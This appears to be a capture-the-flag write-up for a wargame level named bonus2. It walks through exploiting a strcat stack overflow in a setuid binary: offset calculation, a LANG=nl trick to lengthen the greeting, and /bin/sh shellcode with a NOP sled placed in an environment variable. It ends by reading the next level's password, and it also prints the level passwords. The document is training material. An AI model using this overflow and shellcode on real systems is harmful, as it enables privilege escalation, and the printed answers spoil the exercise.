# Bonus2 - strcat overflow

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| bonus2 | `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245` |
| bonus3 | `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute the binary

```shell
~/bonus2

~/bonus2 a

~/bonus2 a b
Hello a
```

The binary takes 2 arguments

```shell
(gdb) info functions
0x08048484  greetuser
0x08048529  main
```

See our assembly interpretation in [source file](../source.c)

The usage is: `~/bonus0 username_part1 username_part2`

The program displays "Hello + `username`" to a username in different languages considering an environment variable "LANG".

The problem is `strcat` that concatenates two strings inside a buffer not big enough.

If `username_part1` has a length greater than `0x12`, the final username will concatenate `username_part1` and `username_part2`

```shell
./bonus2 `python -c "print 'A' * 0x28"` `python -c "print 'A' * 0x20"`
  > Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
  Segmentation fault (core dumped)

./bonus2 `python -c "print 'A' * 0x27"` `python -c "print 'A' * 0x20"`
./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
  > Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

If `username_part1` and `username_part2` are fully filled (72 chars), the program segfaults because `greetings`-buffer can not contains the username and "Hello " string.

We need to find the offset to override EIP register.

```shell
gdb-peda$ run `python -c "print 'A' * 0x28"` `python -c "print 'A' * 0x20"`
  Invalid $PC address: 0x8004141
  Stopped reason: SIGSEGV
  0x08004141 in ?? ()
```

It override a part (2 bytes) of EIP register.

```shell
"Hello " + "A" * 0x28 + "B" * 0x20
    6    +     40   +    32    = 78 - 2 (bytes already overrided) = 76
=> offset at 76
```

We have to put a shellcode address at the index 76.

As `username_part1` and `username_part2` can not exceed 40 and 32 bytes, we need to change to language. "Hello" is longer in finnish or dutch.

In dutch, "hello" is "Goedemiddag! " and has a length of 13.

```shell
"Goedemiddag! " + `username_part1` + `username_part2` + `SHELLCODE_ADDRESS`
      13        +        40        +        23        +          4         = 80
```

Lets set environment variables, build the exploit and get the pass

```shell
export LANG="nl"

export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

./getenv SHELLCODE ~/bonus2
0xbffff780

~/bonus2 `python -c 'print "A" * 40'` `python -c 'print "B" * 23 + "\x80\xf7\xff\xbf"'`
  Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
$ whoami
  bonus3
$ cat /home/user/bonus3/.pass
  71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)

### C

- [Man getenv](https://linux.die.net/man/3/getenv)
- [Man memcmp](https://linux.die.net/man/3/memcmp)
- [Man memcpy](https://linux.die.net/man/3/memcpy)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strcat](https://linux.die.net/man/3/strcat)
- [Man strncpy](https://linux.die.net/man/3/strncpy)

```

```
